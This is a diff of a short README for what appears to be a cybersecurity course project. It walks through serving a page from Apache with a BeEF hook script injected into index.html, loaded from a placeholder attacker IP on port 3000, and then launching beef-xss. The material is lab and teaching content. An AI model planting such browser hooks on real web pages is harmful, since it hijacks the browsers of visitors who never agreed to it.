@@ -8,10 +8,13 @@ Cybersecurity course first project in KGM
 ### Install apache2
 * sudo apt install apache2
 
+### Obtain IP address
+* ipconfig
+
 ### Add script to index.html
 * cd /var/www/html
 * vim index.html
-* within the body tag, insert <script>src="http://IP_ADDRESS/hook.js"</script>
+* within the body tag, insert <script>src="http://IP_ADDRESS:3000/hook.js"</script>
 
 ### Start beEF and run apache
 * beef-xss
